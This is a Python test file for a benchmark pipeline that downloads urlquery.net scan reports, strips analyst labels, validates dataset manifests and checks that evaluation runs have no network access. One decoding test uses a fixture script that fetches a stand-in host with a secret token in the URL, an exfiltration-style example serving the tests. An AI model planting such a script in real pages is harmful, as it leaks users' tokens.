from __future__ import annotations

import http.client
import json
import urllib.error
from pathlib import Path

import pytest

from messageboard_audit_bench import urlquery_data as acquire
from messageboard_audit_bench import urlquery_prepare as prepare
from messageboard_audit_bench.dataset_manifest import validate_dataset

IDS = ["00000000-0000-0000-0000-000000000001", "00000000-0000-0000-0000-000000000002"]


@pytest.fixture
def cfg():
    return acquire.load_config(Path(__file__).parents[1] / "configs/urlquery-data.toml")


def raw(scan_id):
    return {"report_id": scan_id, "date": "2026-01-01T00:00:00Z", "http": [], "url": {},
            "tags": ["ANALYST_LABEL"], "submit": {"tags": ["original_tag"]}}


@pytest.fixture
def catalog(monkeypatch):
    rows = [{"report_id": i, "report_date_utc": "2026-01-01T00:00:00Z"} for i in IDS]
    monkeypatch.setattr(acquire, "catalog", lambda *_: rows)
    monkeypatch.setattr(prepare, "catalog", lambda *_: rows)
    monkeypatch.setattr(acquire.RateGate, "wait", lambda *_: None)
    monkeypatch.setattr(acquire.RateGate, "backoff", lambda *_: None)
    return rows


def test_smoke_summary_is_explicit(tmp_path, cfg, catalog, monkeypatch):
    monkeypatch.setattr(acquire, "public_get", lambda address, *_: json.dumps(raw(address.split("/")[-2])).encode())
    result = acquire.collect(cfg, tmp_path, limit=1)
    assert not result["complete"] and result["not_scheduled"] == 1 and result["limit"] == 1
    assert not (tmp_path / "full-acquisition-summary.json").exists()
    result = acquire.collect(cfg, tmp_path)
    assert result["complete"] and result["previously_cached"] == 1
    assert len(list(tmp_path.glob("cache-manifest-*.json"))) == 2


@pytest.mark.parametrize(("code", "status"), [(403, "access_denied"), (404, "not_available"), (503, "failed")])
def test_http_classification(tmp_path, cfg, catalog, monkeypatch, code, status):
    def fail(*_):
        raise urllib.error.HTTPError("https://urlquery.net", code, "error", {}, None)
    monkeypatch.setattr(acquire, "public_get", fail)
    result = acquire.collect(cfg, tmp_path, limit=1)
    assert result[status] == 1 and not result["complete"]


def test_http_client_error_does_not_escape_worker(tmp_path, cfg, catalog, monkeypatch):
    def fail(*_):
        raise http.client.IncompleteRead(b"partial")
    monkeypatch.setattr(acquire, "public_get", fail)
    result = acquire.collect(cfg, tmp_path, limit=1)
    assert result["failed"] == 1
    assert "IncompleteRead" in (tmp_path / "full-acquisition.jsonl").read_text()


def test_corrupt_cache_fails_closed_without_overwrite(tmp_path, cfg, catalog):
    (tmp_path / "reports").mkdir()
    path = tmp_path / "reports" / f"{IDS[0]}.json"
    path.write_text("broken")
    with pytest.raises(ValueError):
        acquire.collect(cfg, tmp_path)
    assert path.read_text() == "broken"


def test_build_removes_labels_keeps_evidence_and_hashes(tmp_path, cfg, catalog):
    cache = tmp_path / "raw"
    (cache / "reports").mkdir(parents=True)
    for scan_id in IDS:
        (cache / "reports" / f"{scan_id}.json").write_text(json.dumps(raw(scan_id)))
    output = tmp_path / "clean"
    manifest = prepare.build(cfg, cache, output)
    assert manifest["downloaded_count"] == 2
    assert "ANALYST_LABEL" not in (output / "scans.jsonl").read_text()
    assert "original_tag" in (output / "scans.jsonl").read_text()
    assert validate_dataset(output) == manifest
    (output / "leak.txt").write_text("label")
    with pytest.raises(ValueError, match="unlisted"):
        validate_dataset(output)


def test_evaluator_summary_counts_string_statuses_without_payloads(tmp_path, cfg, catalog):
    import runpy

    summarize = runpy.run_path(str(Path(__file__).parents[1] / "docs/assessments/transluce/summarize_snapshot.py"))["summarize"]
    cache = tmp_path / "raw"
    (cache / "reports").mkdir(parents=True)
    for scan_id in IDS:
        report = raw(scan_id)
        report["submit"]["url"] = "https://example.test/a%20b"
        report["http"] = [{"response": {"status_code": "403", "data": {"data": "private_payload"}}}]
        (cache / "reports" / f"{scan_id}.json").write_text(json.dumps(report))
    output = tmp_path / "clean"
    prepare.build(cfg, cache, output)
    source = tmp_path / "article.html"
    source.write_text(f'<article><h2>One</h2><a href="https://urlquery.net/report/{IDS[0]}">scan</a>'
                      f'<h2>Two</h2><a href="https://urlquery.net/report/{IDS[0]}/json">same scan</a></article>')
    result = summarize(output, source)
    coverage = result["article_citation_coverage"]
    assert coverage["cited_scan_count"] == coverage["present_scan_count"] == 1
    assert coverage["scans_with_http_error"] == 1
    assert coverage["scans_with_any_successful_text_decoding"] == 1
    assert coverage["embedded_nonempty_response_bodies"] == 1
    assert coverage["embedded_nonempty_final_dom_bodies"] == 0
    assert result["http_status_counts"] == {"403": 2}
    assert len(result["overlapping_article_sections"]) == 2
    assert "private_payload" not in json.dumps(result)


def test_refuse_incomplete_and_existing_snapshot(tmp_path, cfg, catalog):
    cache = tmp_path / "raw"
    cache.mkdir()
    with pytest.raises(ValueError, match="not acquired"):
        prepare.build(cfg, cache, tmp_path / "output")
    with pytest.raises(ValueError, match="already exists"):
        prepare.build(cfg, cache, cache)


def test_generic_decoding_preserves_program(cfg):
    import base64
    text = "<script>fetch('https://example.test/?token=secret')</script>"
    encoded = base64.b64encode(text.encode()).decode()
    rows = list(prepare.decode_text("https://example.test/base64/" + encoded, cfg))
    assert any(row["text"] == text for row in rows)
    assert any(row["text"] == "https://example.test/a b" for row in prepare.decode_text("https://example.test/a%20b", cfg))
    assert not any(row["parse_status"] == "depth_limit" for row in prepare.decode_text("a%252520b", cfg))
    assert any(row["parse_status"] == "depth_limit" for row in prepare.decode_text("a%25252520b", cfg))


def test_manifest_rejects_symlinks(tmp_path, cfg, catalog):
    cache = tmp_path / "raw"
    (cache / "reports").mkdir(parents=True)
    for scan_id in IDS:
        (cache / "reports" / f"{scan_id}.json").write_text(json.dumps(raw(scan_id)))
    output = tmp_path / "clean"
    prepare.build(cfg, cache, output)
    (output / "extra").symlink_to(cache, target_is_directory=True)
    with pytest.raises(ValueError, match="symlink"):
        validate_dataset(output)


def test_rich_evidence_fixture(tmp_path, cfg, catalog):
    cache = tmp_path / "raw"
    (cache / "reports").mkdir(parents=True)
    for scan_id in IDS:
        report = raw(scan_id)
        report.update(final={"dom": {"data": None, "resource_available": True}},
                      javascript={"script": [{"data": "", "size": 40, "times_seen": 3, "alerts": "ANALYST_LABEL"}]},
                      detection="ANALYST_LABEL", summary="ANALYST_LABEL", sensors="ANALYST_LABEL")
        report["http"] = [{"request": {"method": "POST", "post_data": {"size": 12, "data": "token=secret"},
                                        "headers": {"odd": "\ud800"}},
                           "response": {"data": {"data": "\ud800", "size": 1}, "alerts": "ANALYST_LABEL"}}]
        (cache / "reports" / f"{scan_id}.json").write_text(json.dumps(report))
    output = tmp_path / "clean"
    manifest = prepare.build(cfg, cache, output)
    rows = [json.loads(line) for line in (output / "http.jsonl").read_text().splitlines()]
    body = rows[0]["request"]["post_data"]["local_path"]
    assert (output / body).read_text() == "token=secret"
    resources = [json.loads(line) for line in (output / "resources.jsonl").read_text().splitlines()]
    assert len({(r["scan_id"], r["source_field"]) for r in resources}) == len(resources)
    assert any(r.get("times_seen") == 3 for r in resources)
    assert any(r.get("content_encoding") == "json-string-escaped-unicode" for r in resources)
    assert any(r.get("availability") == "not_in_download" for r in resources)
    for path in output.rglob("*"):
        if path.is_file():
            assert "ANALYST_LABEL" not in path.read_text()
    with pytest.raises(ValueError, match="pinned"):
        validate_dataset(output, expected_sha256="0" * 64)
    assert validate_dataset(output, expected_sha256=manifest["dataset_sha256"])


def test_manifest_preflight_preserves_no_network_and_visibility(tmp_path, cfg, catalog, monkeypatch):
    from tests.test_isolation import preflight
    cache = tmp_path / "raw"
    (cache / "reports").mkdir(parents=True)
    for scan_id in IDS:
        (cache / "reports" / f"{scan_id}.json").write_text(json.dumps(raw(scan_id)))
    work = tmp_path / "work"
    work.mkdir()
    snapshot = tmp_path / "snapshot"
    manifest = prepare.build(cfg, cache, snapshot)
    snapshot.rename(work / "data")  # mount only data, never the provenance sidecar
    monkeypatch.setattr(preflight, "_network_interfaces", lambda: ["lo"])
    def check():
        return preflight.preflight(work, benchmark_id="urlquery", expected_sha256=manifest["dataset_sha256"])
    assert check()["ok"]
    (work / "rubric.txt").write_text("evaluator leak")
    assert not check()["ok"]
    (work / "rubric.txt").unlink()
    monkeypatch.setattr(preflight, "_network_interfaces", lambda: ["lo", "eth0"])
    assert not check()["ok"]


def test_trial_validation_refuses_unsettled_or_wrong_path(tmp_path, cfg, catalog):
    from messageboard_audit_bench.benchmarks import validate_trial_data
    cache = tmp_path / "raw"
    (cache / "reports").mkdir(parents=True)
    (cache / "reports" / f"{IDS[0]}.json").write_text(json.dumps(raw(IDS[0])))
    output = tmp_path / cfg["snapshot"]
    prepare.build(cfg, cache, output, allow_incomplete=True)
    with pytest.raises(ValueError, match="settled"):
        validate_trial_data("urlquery", output)
    (cache / "reports" / f"{IDS[1]}.json").write_text(json.dumps(raw(IDS[1])))
    wrong = tmp_path / "wrong-name"
    prepare.build(cfg, cache, wrong)
    with pytest.raises(ValueError, match="version/path"):
        validate_trial_data("urlquery", wrong)
